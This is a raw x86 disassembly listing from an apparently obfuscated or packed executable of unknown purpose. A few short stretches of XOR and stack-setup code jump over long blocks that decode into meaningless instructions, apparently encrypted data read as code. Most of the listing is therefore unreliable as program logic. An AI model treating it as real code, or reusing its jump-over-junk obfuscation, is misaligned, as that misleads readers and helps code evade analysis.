  419a21:	xor    DWORD PTR ds:0x42833f,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x428357
  419a31:	xor    DWORD PTR ds:0x42826b,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x42826f
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx+0x2f708ffa]
  419a79:	std    
  419a7a:	in     al,dx
  419a7b:	mov    esi,0x1816bbe3
  419a80:	mov    esp,0x29181812
  419a85:	retf   0xf861
  419a88:	jecxz  0x419a5e
  419a8a:	mov    ah,0xef
  419a8c:	dec    ecx
  419a8d:	mov    ebp,0x21973f16
  419a92:	mov    WORD PTR cs:[eax+0x6b2a47fe],ss
  419a99:	mul    DWORD PTR es:[edx]
  419a9c:	xchg   edi,eax
  419a9d:	or     al,0xcc
  419a9f:	in     al,0x82
  419aa1:	inc    ebx
  419aa3:	fisubr DWORD PTR [ebx]
  419aa5:	addr16 pop es
  419aa7:	mov    DWORD PTR [esi+0x58],ebp
  419aaa:	dec    ebx
  419aab:	push   esi
  419aac:	push   ds
  419aad:	xor    edi,ecx
  419aaf:	add    BYTE PTR [esi+0x4f57922d],cl
  419ab5:	jmp    0x419acc
  419ab7:	xor    al,dh
  419ab9:	mov    ds:0x9f242183,al
  419abe:	loope  0x419a61
  419ac0:	xor    al,0xb7
  419ac2:	jecxz  0x419b12
  419ac4:	iret   
  419ac5:	pop    eax
  419ac6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ac7:	dec    ecx
  419ac8:	fadd   st,st(5)
  419aca:	mov    eax,ds:0x80733c86
  419acf:	mov    BYTE PTR ds:[edx],dh
  419ad2:	(bad)  
  419ad3:	xor    DWORD PTR [esi-0x56600f80],ebp
  419ad9:	fld    QWORD PTR [esi+0x563793b7]
  419adf:	add    al,0x8f
  419ae1:	adc    ch,BYTE PTR [edx]
  419ae3:	popf   
  419ae4:	jecxz  0x419ad5
  419ae6:	adc    DWORD PTR ds:0xe7099ea0,edi
  419aec:	and    BYTE PTR [ebx+0x69],bl
  419aef:	and    edx,edx
  419af1:	mov    ds:0x8a94ba34,eax
  419af6:	ins    DWORD PTR es:[edi],dx
  419af7:	push   ds
  419af8:	cwde   
  419af9:	and    ch,BYTE PTR [edi+0x73]
  419afc:	mov    esp,0x93069f6
  419b01:	add    al,BYTE PTR [esi-0x3b]
  419b04:	sub    cl,dh
  419b06:	clc    
  419b07:	fstp   TBYTE PTR [edi-0x1d3d6943]
  419b0d:	(bad)  
  419b10:	adc    al,0x57
  419b12:	push   edi
  419b13:	pop    edi
  419b14:	pop    ecx
  419b15:	ror    BYTE PTR [edi-0x1336e453],0xba
  419b1c:	or     DWORD PTR ss:[ecx+edx*2+0x11d22c7d],eax
  419b24:	xchg   esp,eax
  419b25:	fs dec ebp
  419b27:	xchg   ebp,eax
  419b28:	pop    eax
  419b29:	sbb    BYTE PTR [esi+0x28],dl
  419b2c:	inc    edx
  419b2d:	sub    BYTE PTR [ecx],cl
  419b2f:	jmp    0x779790d9
  419b34:	mov    DWORD PTR [ebp+0x436a1fc6],edx
  419b3a:	ins    BYTE PTR es:[edi],dx
  419b3b:	xchg   esp,eax
  419b3c:	and    DWORD PTR [edx],ebp
  419b3e:	push   cs
  419b3f:	stos   DWORD PTR es:[edi],eax
  419b40:	inc    esp
  419b41:	pop    ds
  419b42:	jmp    0xc5e6:0x589128f3
  419b49:	jmp    0x145e:0x8265c68b
  419b50:	ins    BYTE PTR es:[edi],dx
  419b51:	sbb    BYTE PTR [ecx+ebp*1+0x10],ch
  419b55:	or     esi,DWORD PTR [ebx+0x62]
  419b58:	ins    BYTE PTR es:[edi],dx
  419b59:	mov    bl,0x44
  419b5b:	xor    al,0xd9
  419b5d:	xchg   BYTE PTR [ebp+0x2c],dl
  419b60:	dec    ebp
  419b61:	sbb    BYTE PTR [edx-0x5934fcbc],dl
  419b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b68:	jp     0x419af0
  419b6a:	xor    DWORD PTR [ebp-0x6b81831f],ebx
  419b70:	mov    al,0xb
  419b72:	popa   
  419b73:	sahf   
  419b74:	in     eax,dx
  419b75:	mov    ebx,0x5a193bea
  419b7a:	rcl    BYTE PTR [ecx-0x9],cl
  419b7d:	pop    esi
  419b7e:	jb     0x419b6e
  419b80:	jb     0x419bef
  419b82:	mov    ecx,0xe5569871
  419b87:	jae    0x419b6c
  419b89:	(bad)  
  419b8a:	adc    eax,DWORD PTR [edi+0x7]
  419b8d:	or     ch,BYTE PTR [ebp+0x17835554]
  419b93:	mov    bh,0x3b
  419b95:	js     0x419bd2
  419b97:	aam    0xcf
  419b99:	gs jns 0x419bae
  419b9c:	fxch   st(2)
  419b9e:	loop   0x419b25
  419ba0:	mov    ecx,0x7f409e8c
  419ba5:	push   ebp
  419ba6:	xchg   esi,eax
  419ba7:	aas    
  419ba8:	gs adc eax,0x4b136425
  419bae:	outs   dx,DWORD PTR ds:[esi]
  419baf:	xchg   edx,eax
  419bb0:	mov    DWORD PTR [ebx+0x41729069],ebx
  419bb6:	inc    esi
  419bb7:	repnz fwait
  419bb9:	and    bl,ch
  419bbb:	test   DWORD PTR [edx],ebp
  419bbd:	fst    DWORD PTR [ecx+0x45e629b4]
  419bc3:	add    ebp,edi
  419bc5:	push   esp
  419bc6:	dec    edx
  419bc7:	inc    esp
  419bc8:	inc    edx
  419bc9:	in     al,dx
  419bca:	(bad)  
  419bcb:	jg     0x419b68
  419bcd:	xchg   ebp,eax
  419bce:	add    BYTE PTR [edi-0x1bca7f52],al
  419bd4:	hlt    
  419bd5:	mov    bl,0x88
  419bd7:	xchg   DWORD PTR [ebx-0x64],esp
  419bda:	jmp    0x2acebae9
  419bdf:	dec    edi
  419be0:	inc    ecx
  419be1:	dec    ebp
  419be2:	ret    
  419be3:	pop    esi
  419be4:	mov    eax,0x4d35e666
  419be9:	pop    esp
  419bea:	lahf   
  419beb:	mov    ah,BYTE PTR ds:0xba85f022
  419bf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bf2:	std    
  419bf3:	enter  0xe245,0x6c
  419bf7:	mov    ah,0x84
  419bf9:	push   0x3b17f638
  419bfe:	xchg   ecx,eax
  419bff:	out    dx,al
  419c00:	fs inc esi
  419c02:	push   esp
  419c03:	mov    ebp,esp
  419c05:	pop    ecx
  419c06:	adc    DWORD PTR [ecx-0x3612080f],ebx
  419c0c:	fidivr DWORD PTR [ebx+0x45]
  419c0f:	jge    0x419bf4
  419c11:	push   esp
  419c12:	mov    esi,0x92813276
  419c17:	fldenv [ecx-0x66]
  419c1a:	fsubr  st,st(0)
  419c1c:	ds add eax,0xdb5e2501
  419c22:	jl     0x419ca0
  419c24:	icebp  
  419c25:	int3   
  419c26:	int    0xf6
  419c28:	sub    ebx,DWORD PTR [ebx-0x15]
  419c2b:	xchg   edi,eax
  419c2c:	pop    eax
  419c2d:	fdiv   DWORD PTR [ebp+0x9386e99]
  419c33:	dec    ecx
  419c34:	sar    DWORD PTR [esi+0x69],cl
  419c37:	adc    BYTE PTR [edi-0x71],0x14
  419c3b:	mov    ?,WORD PTR [ebp+0x33]
  419c3e:	mov    esp,0x7f668f8a
  419c43:	das    
  419c44:	mov    eax,DWORD PTR [ebp-0x54]
  419c47:	(bad)  
  419c48:	and    al,0xab
  419c4a:	call   0x98c9:0xe40f0a55
  419c51:	fbstp  TBYTE PTR [edx+eiz*1]
  419c54:	fmul   DWORD PTR [eax+0x6f1d548c]
  419c5a:	data16 cmp BYTE PTR [edx-0x26],0xcf
  419c5f:	or     BYTE PTR [ebp-0x3],al
  419c62:	xchg   BYTE PTR [edx-0x60],cl
  419c65:	sub    eax,0x83207955
  419c6a:	xor    eax,0xdae53b60
  419c70:	nop
  419c71:	mov    WORD PTR [ebp+0x7f1e5980],?
  419c77:	ret    
  419c78:	dec    ebx
  419c79:	ffree  st(7)
  419c7b:	aas    
  419c7c:	(bad)  
  419c7d:	and    al,BYTE PTR [edi]
  419c7f:	hlt    
  419c80:	inc    esp
  419c81:	test   edi,0xef4075e9
  419c87:	sti    
  419c88:	jmp    0xa8ac22f3
  419c8d:	xchg   edi,eax
  419c8e:	shl    edi,0x3f
  419c91:	xchg   esp,eax
  419c92:	xchg   ah,cl
  419c94:	test   eax,0x2383dd56
  419c99:	ret    0xdb33
  419c9c:	dec    ecx
  419c9d:	inc    edx
  419c9e:	cld    
  419c9f:	mov    esi,DWORD PTR [eax]
  419ca1:	leave  
  419ca2:	push   esp
  419ca3:	sub    edi,DWORD PTR [eax+0x2b]
  419ca6:	imul   eax,DWORD PTR [ecx+0xf],0x7d
  419caa:	iret   
  419cab:	ja     0x419ce5
  419cad:	(bad)  
  419caf:	lods   al,BYTE PTR ds:[esi]
  419cb0:	mov    al,ds:0x515d2167
  419cb5:	sub    al,0x17
  419cb7:	adc    DWORD PTR [edi-0x2face96f],edi
  419cbd:	popf   
  419cbe:	add    al,BYTE PTR [edi-0x28b4926b]
  419cc4:	add    dh,BYTE PTR es:[eax]
  419cc7:	imul   edi,DWORD PTR [ecx],0xd6b9ad50
  419ccd:	adc    al,0x49
  419ccf:	loope  0x419cfc
  419cd1:	stc    
  419cd2:	test   BYTE PTR [ecx],cl
  419cd4:	inc    eax
  419cd5:	test   al,0xb
  419cd7:	mov    cl,0x9c
  419cd9:	dec    esp
  419cda:	cli    
  419cdb:	shl    BYTE PTR [ebp+0x77b366e],0xae
  419ce2:	ins    DWORD PTR es:[edi],dx
  419ce3:	cmp    DWORD PTR [esi-0x3f],edi
  419ce6:	jns    0x419cde
  419ce8:	pop    ebx
  419ce9:	shl    DWORD PTR [edx+0x6f2641d6],0x2d
  419cf0:	iret   
  419cf1:	or     eax,0x74a15824
  419cf6:	mov    bh,0xfe
  419cf8:	mov    bl,ah
  419cfa:	retf   0x3204
  419cfd:	call   0x54e8d076
  419d02:	fwait
  419d03:	sbb    BYTE PTR [edi],0xd
  419d06:	xor    eax,0x956dbd24
  419d0b:	adc    dh,BYTE PTR [ecx]
  419d0d:	aam    0x4a
  419d0f:	push   cs
  419d10:	inc    edx
  419d11:	cmp    al,0x4d
  419d13:	mov    esp,0xba637313
  419d18:	mov    BYTE PTR [ebx-0x7e],cl
  419d1b:	dec    esp
  419d1c:	pop    ebp
  419d1d:	inc    edx
  419d1e:	xor    BYTE PTR [ebp+0x5c797767],bh
  419d24:	inc    esi
  419d25:	rcr    DWORD PTR [bx+di],0x65
  419d29:	sub    ebx,DWORD PTR [ebx]
  419d2b:	jne    0x419cad
  419d2d:	test   al,0xe0
  419d2f:	xchg   ebp,eax
  419d30:	addr16 sub al,0x67
  419d33:	(bad)  [ebp-0x641b8300]
  419d39:	scas   al,BYTE PTR es:[edi]
  419d3a:	sti    
  419d3b:	inc    ecx
  419d3c:	jae    0x419cbf
  419d3e:	mov    ebp,0x9497da41
  419d43:	jmp    0x6de1107b
  419d48:	add    ah,BYTE PTR ds:0xccfda813
  419d4e:	or     dl,BYTE PTR ds:[ebx-0x19f3b72d]
  419d55:	add    ebp,edx
  419d57:	and    DWORD PTR [esp+eax*1+0xc],edi
  419d5b:	leave  
  419d5c:	or     DWORD PTR [edx+0x2e229d43],esp
  419d62:	out    dx,eax
  419d63:	stos   DWORD PTR es:[edi],eax
  419d64:	(bad)  
  419d65:	into   
  419d66:	scas   al,BYTE PTR es:[edi]
  419d67:	or     DWORD PTR [esi+0x89dc3f7],eax
  419d6d:	jae    0x419db7
  419d6f:	(bad)  
  419d70:	fld    QWORD PTR [ebp+0x705c7a43]
  419d76:	jecxz  0x419d47
  419d78:	xor    cl,ch
  419d7a:	mov    ecx,0x6d894fe3
  419d7f:	nop
  419d80:	popf   
  419d81:	clc    
  419d82:	or     DWORD PTR [ecx+0x1bd8f068],esi
  419d88:	or     BYTE PTR [edx+0xc],0xb9
  419d8c:	mov    ds:0x1110371d,eax
  419d91:	jo     0x419d43
  419d93:	and    cl,bl
  419d95:	fmul   DWORD PTR [edx]
  419d97:	mov    edi,0x30e81009
  419d9c:	das    
  419d9d:	push   ss
  419d9e:	retf   0x1377
  419da1:	sub    esi,esp
  419da3:	or     al,0xd0
  419da5:	(bad)  
  419da6:	or     al,0xef
  419da8:	or     edx,DWORD PTR [esi-0x8a2fce6]
  419dae:	cdq    
  419daf:	and    eax,0xf8bfe642
  419db4:	into   
  419db5:	sbb    cl,BYTE PTR [ecx-0x738927e1]
  419dbb:	mov    ebx,0xacc0f4d3
  419dc0:	xor    eax,DWORD PTR [eax]
  419dc2:	mul    DWORD PTR [ecx]
  419dc4:	mov    ah,0x25
  419dc6:	in     eax,0x13
  419dc8:	das    
  419dc9:	sub    DWORD PTR ds:0xa9ffae73,edi
  419dcf:	ja     0x419dbd
  419dd1:	sbb    al,0x8d
  419dd3:	(bad)  
  419dd4:	stc    
  419dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dd6:	fmul   st,st(2)
  419dd8:	retf   0xb765
  419ddb:	imul   BYTE PTR [edi+0x4e]
  419dde:	mov    DWORD PTR [edx],esi
  419de0:	cmp    eax,0x7353838c
  419de5:	mov    ecx,DWORD PTR [ecx+0x3a6a4dc5]
  419deb:	and    eax,0x5c4ea340
  419df0:	mul    DWORD PTR [edx]
  419df2:	mov    fs,WORD PTR [ecx-0x18]
  419df5:	iret   
  419df6:	mov    ch,0xf8
  419df8:	adc    al,0xcc
  419dfa:	mul    BYTE PTR [ecx]
  419dfc:	lods   eax,DWORD PTR ds:[esi]
  419dfd:	adc    ebp,eax
  419dff:	mov    ds:0x2f6c96fc,eax
  419e04:	dec    esi
  419e05:	sar    DWORD PTR [edx+0x5f],0x21
  419e09:	cwde   
  419e0a:	push   ebx
  419e0b:	pop    ss
  419e0c:	int3   
  419e0d:	xchg   ebp,eax
  419e0e:	dec    esp
  419e0f:	mov    edx,0x85c74ad3
  419e14:	sbb    eax,0x3a5b9a90
  419e19:	lahf   
  419e1a:	mov    ah,0xb3
  419e1c:	or     eax,0x79be34b8
  419e21:	adc    dh,dh
  419e23:	fild   QWORD PTR [esi-0x121d0f4e]
  419e29:	stc    
  419e2a:	clc    
  419e2b:	arpl   WORD PTR [edi+eiz*4+0x30],bp
  419e2f:	outs   dx,BYTE PTR ds:[esi]
  419e30:	sub    cl,BYTE PTR [ecx-0x36fb6dcd]
  419e36:	mov    ecx,DWORD PTR [esp+0x14]
  419e3a:	mov    edx,DWORD PTR [esp+0x30]
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0x705f331c
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	outs   dx,DWORD PTR ds:[esi]
  419e6f:	ja     0x419ea4
  419e71:	cs adc al,0x93
  419e74:	sahf   
  419e75:	dec    esp
  419e76:	inc    ebx
  419e77:	sbb    DWORD PTR [ebx+0x61],0xfde72812
  419e7e:	pop    edx
  419e7f:	adc    BYTE PTR [edx-0x57cf5618],0x7
  419e86:	xchg   DWORD PTR [edx+0x682855d9],edx
  419e8c:	pop    es
  419e8d:	icebp  
  419e8e:	jne    0x419e1d
  419e90:	and    al,0xf9
  419e92:	mov    BYTE PTR [ebx-0x73dd7326],dh
  419e98:	xor    eax,0xbe548e56
  419e9d:	out    dx,al
  419e9e:	mov    fs,edi
  419ea0:	test   eax,0xf712293
  419ea5:	or     BYTE PTR [ecx],cl
  419ea7:	and    ebp,DWORD PTR [ecx-0x32fcd7cc]
  419ead:	push   esp
  419eae:	sahf   
  419eaf:	sbb    edx,DWORD PTR [ebx-0x2a43bb1c]
  419eb5:	xchg   ebx,eax
  419eb6:	lea    ebx,[edx-0x18f12c89]
  419ebc:	xchg   edx,eax
  419ebd:	je     0x419e4a
  419ebf:	sbb    BYTE PTR [eax+0x63],cl
  419ec2:	pop    esp
  419ec3:	stc    
  419ec4:	xor    al,0x56
  419ec6:	jnp    0x419e48
  419ec8:	push   edx
  419ec9:	arpl   WORD PTR [ecx],sp
  419ecb:	sub    al,0x1f
  419ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ece:	(bad)  
  419ed0:	xchg   esp,eax
  419ed1:	pop    es
  419ed2:	mov    bh,0x9c
  419ed4:	sbb    DWORD PTR [edx],ebx
  419ed6:	aam    0xac
  419ed8:	test   al,0xdd
  419eda:	sbb    ecx,DWORD PTR [esp+ecx*8]
  419edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ede:	inc    edi
  419edf:	and    BYTE PTR [ebp-0x62],0x18
  419ee3:	and    al,0xb9
  419ee5:	adc    esp,DWORD PTR [edx-0x1227d8e8]
  419eeb:	add    edx,eax
  419eed:	ins    BYTE PTR es:[edi],dx
  419eee:	cs or  al,0x8e
  419ef1:	mov    eax,ds:0xa8fad4e3
  419ef6:	or     BYTE PTR [ebx+0x76],bl
  419ef9:	xchg   ebx,eax
  419efa:	push   eax
  419efc:	(bad)  
  419efe:	inc    ebp
  419eff:	add    cl,BYTE PTR [edi]
  419f01:	pop    ss
  419f02:	push   edi
  419f03:	jge    0x419f75
  419f05:	imul   ebp,DWORD PTR [edi],0x4ba03dc6
  419f0b:	in     al,dx
  419f0c:	mov    ch,dh
  419f0e:	int3   
  419f0f:	mov    esp,0xafb7305e
  419f14:	int    0x20
  419f16:	push   ss
  419f17:	jecxz  0x419ef4
  419f19:	push   edx
  419f1a:	push   eax
  419f1c:	xchg   esp,eax
  419f1d:	out    0x27,eax
  419f1f:	inc    esi
  419f20:	jns    0x419eae
  419f22:	xor    DWORD PTR [esi-0x5d],0x5c
  419f26:	call   0x90c21ba4
  419f2b:	(bad)  
  419f2c:	mov    ecx,0xca66eb00
  419f31:	lock add ebx,DWORD PTR [esi+0x54]
  419f35:	adc    esi,edx
  419f37:	mov    ah,0x7c
  419f39:	inc    edi
  419f3a:	and    eax,0xc2e7909
  419f3f:	or     al,0xf6
  419f41:	stc    
  419f42:	xor    edi,esi
  419f44:	adc    esi,edx
  419f46:	add    eax,0x9fb59284
  419f4b:	mov    bh,0xac
  419f4d:	fnstcw WORD PTR [edi-0x42]
  419f50:	jno    0x419fba
  419f52:	pop    ds
  419f53:	push   ebx
  419f54:	or     al,BYTE PTR [eax+edx*8]
  419f57:	xor    al,0x54
  419f59:	pusha  
  419f5a:	and    BYTE PTR [edx+edi*2+0x9],ah
  419f5e:	aad    0xe8
  419f60:	sub    ecx,DWORD PTR [edx-0x5758c894]
  419f66:	push   ebp
  419f67:	mov    WORD PTR [ebp+0x16b8d64],cs
  419f6d:	leave  
  419f6e:	(bad)  
  419f6f:	xlat   BYTE PTR ds:[ebx]
  419f70:	cs sti 
  419f72:	xlat   BYTE PTR ds:[ebx]
  419f73:	xchg   BYTE PTR [esi-0x67df9b7b],bl
  419f79:	(bad)  
  419f7a:	test   al,0x33
  419f7c:	ds push es
  419f7e:	fwait
  419f7f:	push   cs
  419f80:	rol    DWORD PTR [edx-0x2],0x4e
  419f84:	(bad)  
  419f86:	sbb    BYTE PTR [edi-0x33],cl
  419f89:	mov    esi,0xc7700543
  419f8e:	xlat   BYTE PTR ds:[ebx]
  419f8f:	mov    ebx,0xe43c9d8b
  419f94:	add    esp,DWORD PTR [edi+0x62098cd]
  419f9a:	pushf  
  419f9b:	lods   al,BYTE PTR ds:[esi]
  419f9c:	(bad)  
  419f9d:	stos   DWORD PTR es:[edi],eax
  419f9e:	mov    dh,0xf6
  419fa0:	(bad)  [esp+eiz*8-0x150de72f]
  419fa7:	lock push 0x1b
  419faa:	out    dx,eax
  419fab:	dec    ebx
  419fac:	ja     0x419ff8
  419fae:	xchg   ebx,eax
  419faf:	sbb    esp,DWORD PTR [edx]
  419fb1:	rol    DWORD PTR [esi+0x6a223edb],cl
  419fb7:	adc    eax,0x9e9ccbd6
  419fbc:	shl    BYTE PTR [eax+0x28],0x4c
  419fc0:	(bad)  
  419fc1:	push   ss
  419fc2:	push   0x4e5f34b2
  419fc7:	shl    BYTE PTR [esi+0xfdd90cf],cl
  419fcd:	push   eax
  419fce:	fisttp DWORD PTR [ebx+0x56]
  419fd1:	inc    ecx
  419fd2:	lar    edi,WORD PTR [eax+0x102956b2]
  419fd9:	xor    eax,0xb38364df
  419fde:	(bad)  
  419fdf:	push   ecx
  419fe0:	pop    es
  419fe1:	cmp    BYTE PTR [edi],cl
  419fe3:	fdivr  DWORD PTR [eax-0x6061906]
  419fe9:	and    DWORD PTR ds:0xb03b1bda,eax
  419fef:	dec    ecx
  419ff0:	daa    
  419ff1:	add    BYTE PTR [edi+0x1b],0x3e
  419ff5:	jge    0x419f7b
  419ff7:	fstp   DWORD PTR [ebx]
  419ff9:	fiadd  WORD PTR [edx-0x47]
  419ffc:	bound  ecx,QWORD PTR [ecx+edi*2+0x124c41fe]
  41a003:	and    eax,0x117f71bb
  41a008:	aaa    
  41a009:	retf   0xa230
  41a00c:	mov    edx,0x5a33f2ca
  41a011:	mov    esi,0x37358fa5
  41a016:	mov    ah,0x96
  41a018:	bound  esp,QWORD PTR [ebx-0x2a]
  41a01b:	stos   DWORD PTR es:[edi],eax
  41a01c:	aad    0x90
  41a01e:	xor    eax,0xe161be4b
  41a023:	loopne 0x41a011
  41a025:	mov    al,ds:0x3f96857b
  41a02a:	mov    esp,0x6b31b71b
  41a02f:	xchg   ebp,eax
  41a030:	mov    ah,al
  41a032:	(bad)  
  41a033:	fisub  DWORD PTR [eax+eax*4]
  41a036:	pop    ebp
  41a037:	in     eax,0x70
  41a039:	add    al,0x68
  41a03b:	or     eax,0x85cc3229
  41a040:	test   ah,ah
  41a042:	dec    eax
  41a043:	(bad)  
  41a044:	and    BYTE PTR [ecx+eax*8+0x45],ch
  41a048:	call   0xbf27:0x2b4f747e
  41a04f:	mov    ds:0x100a5755,al
  41a054:	inc    eax
  41a055:	pusha  
  41a056:	adc    cl,BYTE PTR [edx]
  41a058:	hlt    
  41a059:	aam    0x4b
  41a05b:	or     bl,cl
  41a05d:	stos   DWORD PTR es:[edi],eax
  41a05e:	test   DWORD PTR [esi+0x2f35975b],ecx
  41a064:	js     0x41a086
  41a066:	pop    ss
  41a067:	xor    BYTE PTR [edi],ch
  41a069:	hlt    
  41a06a:	shr    ecx,cl
  41a06c:	retf   0xbe99
  41a06f:	repz push edx
  41a072:	shl    DWORD PTR [ecx],1
  41a074:	jl     0x41a0e3
  41a076:	pop    ds
  41a077:	retf   0x3b3a
  41a07a:	scas   al,BYTE PTR es:[edi]
  41a07b:	jbe    0x41a08c
  41a07d:	bound  esp,QWORD PTR [esi]
  41a07f:	add    esp,DWORD PTR [ebp+0x3fab0b8e]
  41a085:	add    al,BYTE PTR [ecx-0x7b]
  41a088:	scas   eax,DWORD PTR es:[edi]
  41a089:	jbe    0x41a080
  41a08b:	ret    0xf3e0
  41a08e:	ins    DWORD PTR es:[edi],dx
  41a08f:	xor    DWORD PTR [ecx],eax
  41a091:	and    eax,0xb1951d89
  41a096:	inc    eax
  41a097:	out    dx,al
  41a098:	aas    
  41a099:	push   ebx
  41a09a:	inc    ebx
  41a09b:	jp     0x41a0db
  41a09d:	je     0x41a11e
  41a09f:	call   0xd6de:0x33c21a09
  41a0a6:	mov    ebx,0xc8964059
  41a0ab:	dec    ecx
  41a0ac:	cmp    ah,BYTE PTR [edx+0x68]
  41a0af:	popf   
  41a0b0:	test   DWORD PTR [esp+ebx*1],edi
  41a0b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0b4:	in     al,dx
  41a0b5:	mov    ebp,0x3f8f46f3
  41a0ba:	sub    DWORD PTR [edi+0x6c],esp
  41a0bd:	je     0x41a0d8
  41a0bf:	adc    ecx,0x5ffc67fb
  41a0c5:	xchg   esp,eax
  41a0c6:	retf   
  41a0c7:	stos   BYTE PTR es:[edi],al
  41a0c8:	(bad)  
  41a0c9:	(bad)  
  41a0ca:	jmp    0x41a12a
  41a0cc:	imul   edx,ecx,0x37
  41a0cf:	mov    edx,0x5ca4f177
  41a0d4:	es dec ecx
  41a0d6:	lds    eax,FWORD PTR [eax+edx*8+0x5808c1e3]
  41a0dd:	fidiv  DWORD PTR [ecx+0x2e]
  41a0e0:	not    DWORD PTR [ecx]
  41a0e2:	jmp    0xc46c:0x4abd948b
  41a0e9:	pop    edx
  41a0ea:	or     al,0x1c
  41a0ec:	or     al,0x8
  41a0ee:	pop    es
  41a0ef:	push   esp
  41a0f0:	inc    BYTE PTR [esi]
  41a0f2:	jb     0x41a168
  41a0f4:	xchg   bl,dh
  41a0f6:	pop    ebx
  41a0f7:	ret    
  41a0f8:	jno    0x41a130
  41a0fa:	mov    edx,eax
  41a0fc:	popa   
  41a0fd:	jl     0x41a07f
  41a0ff:	mov    fs,WORD PTR [edi]
  41a101:	in     al,dx
  41a102:	out    dx,al
  41a103:	test   al,0x21
  41a105:	sub    edx,DWORD PTR [edx-0x4c39363b]
  41a10b:	cmc    
  41a10c:	mov    eax,0x76a380b
  41a111:	ins    BYTE PTR es:[edi],dx
  41a112:	push   ebp
  41a113:	ja     0x41a13b
  41a115:	sub    al,0x23
  41a117:	lods   al,BYTE PTR ds:[esi]
  41a118:	in     al,0xa
  41a11a:	popf   
  41a11b:	mov    ebp,0xcd5251e2
  41a120:	xchg   esi,eax
  41a121:	jmp    0xf393:0x1d8e6281
  41a128:	push   ebp
  41a129:	xor    eax,0x4b0573f2
  41a12e:	daa    
  41a12f:	xor    eax,0x7aa52b54
  41a134:	jecxz  0x41a0f7
  41a136:	mov    cl,0x41
  41a138:	mov    al,0x69
  41a13a:	sbb    BYTE PTR [ebx-0x56a349a4],dl
  41a140:	mov    ?,WORD PTR [edx]
  41a142:	pop    ebx
  41a143:	mov    ah,0x33
  41a145:	hlt    
  41a146:	ja     0x41a12c
  41a148:	jno    0x41a15c
  41a14a:	arpl   WORD PTR [ebx+ebx*8],si
  41a14d:	mov    ds:0xbd59510f,eax
  41a152:	adc    cl,BYTE PTR [eax-0x36]
  41a155:	mov    ebp,0x8566a51c
  41a15a:	dec    edi
  41a15b:	mov    ch,0xfd
  41a15d:	fcmovb st,st(0)
  41a15f:	test   DWORD PTR [esi+0x53],ecx
  41a162:	pop    edi
  41a163:	dec    edx
  41a164:	in     al,0xb9
  41a166:	mov    ah,BYTE PTR [edi-0x5b]
  41a169:	and    BYTE PTR [ebp+0x1cff6082],dh
  41a16f:	bound  ebp,QWORD PTR [edi+0x58862b03]
  41a175:	mov    al,ds:0xad75dd4d
  41a17a:	fwait
  41a17b:	psraw  mm5,mm0
  41a17e:	mov    cl,0x20
  41a180:	xlat   BYTE PTR ds:[ebx]
  41a181:	and    bl,bl
  41a183:	enter  0xbff1,0x52
  41a187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a188:	inc    edi
  41a189:	inc    edx
  41a18a:	and    DWORD PTR [edx-0xc],edx
  41a18d:	dec    esi
  41a18e:	push   esi
  41a18f:	cmovo  ebp,DWORD PTR [ebx+0x52]
  41a193:	std    
  41a194:	cmp    dh,BYTE PTR [ebx-0x3ca363e9]
  41a19a:	mov    bh,0x16
  41a19c:	sub    al,0x90
  41a19e:	cmp    DWORD PTR [ebp+0x3],0x1a
  41a1a2:	(bad)  
  41a1a3:	jle    0x41a12a
  41a1a5:	sub    ebp,edi
  41a1a7:	cwde   
  41a1a8:	cmp    DWORD PTR [edx+eiz*1-0x68e4e722],eax
  41a1af:	cmp    cl,dh
  41a1b1:	xchg   edx,eax
  41a1b2:	pop    esi
  41a1b3:	xchg   esp,eax
  41a1b4:	(bad)  
  41a1b5:	and    ebp,DWORD PTR [edx+0x47]
  41a1b8:	dec    eax
  41a1b9:	xor    eax,0x8fbd8761
  41a1be:	or     esp,DWORD PTR ds:0xedacb157
  41a1c4:	pusha  
  41a1c5:	mov    ch,0x18
  41a1c7:	pop    edx
  41a1c8:	sahf   
  41a1c9:	jnp    0x41a1df
  41a1cb:	and    al,0xce
  41a1cd:	push   eax
  41a1ce:	xor    BYTE PTR [edx],cl
  41a1d0:	adc    eax,0x149adfc0
  41a1d5:	lods   eax,DWORD PTR ds:[esi]
  41a1d6:	ins    BYTE PTR es:[edi],dx
  41a1d7:	pop    esi
  41a1d8:	pusha  
  41a1d9:	inc    ebx
  41a1da:	mov    ah,0xc4
  41a1dc:	(bad)  
  41a1dd:	ins    BYTE PTR es:[edi],dx
  41a1de:	push   es
  41a1df:	mov    eax,0xe4af0682
  41a1e4:	retf   
  41a1e5:	jecxz  0x41a21d
  41a1e7:	mov    bh,0x40
  41a1e9:	xor    esi,DWORD PTR [ebp-0x39]
  41a1ec:	xchg   BYTE PTR [eax-0x7c099703],bl
  41a1f2:	popf   
  41a1f3:	lea    ecx,[ebp-0x3aeacd17]
  41a1f9:	dec    ecx
  41a1fa:	xchg   ebx,eax
  41a1fb:	adc    dh,BYTE PTR [ebx]
